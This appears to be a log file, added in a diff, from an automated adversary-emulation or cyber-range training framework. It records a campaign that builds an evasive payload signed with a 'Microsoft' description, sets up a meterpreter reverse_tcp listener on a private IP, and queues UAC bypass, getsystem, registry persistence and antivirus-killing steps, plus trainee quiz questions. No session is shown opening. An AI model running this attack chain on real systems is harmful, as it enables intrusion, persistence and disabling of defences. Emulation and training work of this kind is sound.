@@ -1,0 +1,77 @@
+2020-03-31 02:37:09,776- attack-thread - INFO - Property Not Found
+2020-03-31 02:37:09,926- attack-thread - INFO - ....................Parsing the Campaign....................
+2020-03-31 02:37:09,934- attack-thread - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 3, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA04_T1088_P1': {'name': 'bypassuac_sluihijack', 'tactic': 'Privilege_Escalation', 'try_count': 3, 'spawn_seperate_session': False, 'tool': 'metasploit', 'exploit': 'windows/local/bypassuac_sluihijack', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA04_T1134_P1': {'name': 'getsystem', 'tactic': 'Privilege_Escalation', 'try_count': 1, 'spawn_seperate_session': False, 'type': 'command', 'service': 'None', 'tool': 'meterpreter', 'command': 'getsystem'}}, {'TA03_T1060_P2': {'name': 'registry_persistence', 'tactic': 'Persistence', 'try_count': 1, 'spawn_seperate_session': False, 'tool': 'metasploit', 'post': 'windows/local/registry_persistence', 'payload': 'payload windows/x64/meterpreter/reverse_tcp', 'options': {'BLOB_REG_NAME': 'BLOB_REG_NAME_$ref', 'RUN_NAME': 'RUN_NAME_$ref', 'STARTUP': 'SYSTEM', 'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA05_T1089_P2': {'name': 'killav', 'tactic': 'Defense_Evasion', 'try_count': 5, 'tool': 'meterpreter', 'type': 'script', 'script': 'post/windows/manage/killav'}}]
+2020-03-31 02:37:09,935- attack-thread - INFO - *****************************Check tools status*****************************
+2020-03-31 02:37:09,936- attack-thread - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible', 'metasploit', 'meterpreter', 'metasploit', 'meterpreter']
+2020-03-31 02:37:09,937- attack-thread - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
+2020-03-31 02:37:09,937- attack-thread - INFO - ansible = [32mTrue[0m
+2020-03-31 02:37:09,938- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 02:37:09,939- attack-thread - INFO - ansible = [32mTrue[0m
+2020-03-31 02:37:09,939- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 02:37:09,940- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-31 02:37:09,940- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-31 02:37:09,940- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-31 02:37:09,965- attack-thread - INFO - ....................Spawning Phantom Evasion....................
+2020-03-31 02:37:09,966- attack-thread - INFO - Reason: payload generation
+2020-03-31 02:37:20,459- attack-thread - INFO - Please insert option: 1
+2020-03-31 02:37:21,117- attack-thread - INFO - Please insert option: 2
+2020-03-31 02:37:21,676- attack-thread - INFO - Please insert option: 2
+2020-03-31 02:37:23,236- attack-thread - INFO - Please insert payload number: 3
+2020-03-31 02:37:23,393- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 02:37:23,551- attack-thread - INFO - Please insert LHOST: 192.168.18.61
+2020-03-31 02:37:23,603- attack-thread - INFO - Please insert LPORT: 34351
+2020-03-31 02:37:23,654- attack-thread - INFO - Please insert output filename: mongo
+2020-03-31 02:37:24,206- attack-thread - INFO - Add multiple processes behaviour: n
+2020-03-31 02:37:25,537- attack-thread - INFO - Strip executable\?: y
+2020-03-31 02:37:27,097- attack-thread - INFO - Sign executable\?: y
+2020-03-31 02:37:27,150- attack-thread - INFO - use already existing certificate: y
+2020-03-31 02:37:27,202- attack-thread - INFO - Select a Certificate: 1
+2020-03-31 02:37:27,253- attack-thread - INFO - Insert sign software description: Microsoft
+2020-03-31 02:37:28,550- attack-thread - INFO - Press Enter to continue: 
+2020-03-31 02:37:29,007- attack-thread - INFO - Please insert option: 0
+2020-03-31 02:37:29,008- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:37:29,009- attack-thread - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
+2020-03-31 02:37:29,009- attack-thread - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
+2020-03-31 02:37:40,656- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:37:40,656- attack-thread - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
+2020-03-31 02:37:40,656- attack-thread - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
+2020-03-31 02:37:40,675- attack-thread - INFO - No Exceptions Found
+2020-03-31 02:37:40,693- attack-thread - INFO - post not needed
+2020-03-31 02:37:40,708- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-03-31 02:37:40,708- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-03-31 02:37:40,708- attack-thread - INFO - payload['LPORT'] not needed...
+2020-03-31 02:37:40,738- attack-thread - INFO - cid: 27
+2020-03-31 02:37:40,738- attack-thread - INFO - Starting Another Thread
+2020-03-31 02:37:40,739- metasploit-thread - INFO - ....................Executing Exploit......................................
+2020-03-31 02:37:42,574- metasploit-thread - INFO - {'job_id': 43, 'uuid': 'topnculg'}
+2020-03-31 02:37:42,580- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:37:45,604- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:37:45,742- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:37:45,743- attack-thread - INFO - Appending Generalize questions_answers
+2020-03-31 02:37:45,744- attack-thread - INFO - Appending scenario-specific questions_answers
+2020-03-31 02:37:45,745- attack-thread - INFO - *****************************Questions*****************************
+2020-03-31 02:37:45,745- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'source_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'payload_name_$ref'}}
+2020-03-31 02:37:45,747- attack-thread - INFO - Property Not Found
+2020-03-31 02:37:45,747- attack-thread - INFO - Property Not Found
+2020-03-31 02:37:45,748- attack-thread - INFO - *****************************Actual Answers*****************************
+2020-03-31 02:37:45,748- attack-thread - INFO - ['192.168.18.61', 38824, None, None]
+2020-03-31 02:37:45,776- attack-thread - INFO - evaluation id:5e826722e52c551b60c4b9fc
+2020-03-31 02:37:45,777- attack-thread - INFO - ************************Updating Evaluation form for user**********************
+2020-03-31 02:37:45,805- attack-thread - INFO - TA01_T1091_P1 has been appended in evaluation
+2020-03-31 02:37:45,805- attack-thread - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
+2020-03-31 02:37:45,836- attack-thread - INFO - command is mongo.exe
+2020-03-31 02:37:48,638- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:37:51,665- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:37:54,693- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:37:57,694- metasploit-thread - INFO - Do not re-execute: its just a listener!!!
+2020-03-31 02:37:57,723- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:38:00,751- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:38:03,778- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:38:05,565- attack-thread - INFO - **************************Exploring Evaluation**********************
+2020-03-31 02:38:05,566- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
+2020-03-31 02:38:05,566- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
+2020-03-31 02:38:05,585- attack-thread - INFO - ....................Executing Meterpreter Command...............................
+2020-03-31 02:38:06,813- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:38:09,840- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-31 02:38:12,842- metasploit-thread - INFO - Do not re-execute: its just a listener!!!
+2020-03-31 02:38:12,851- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
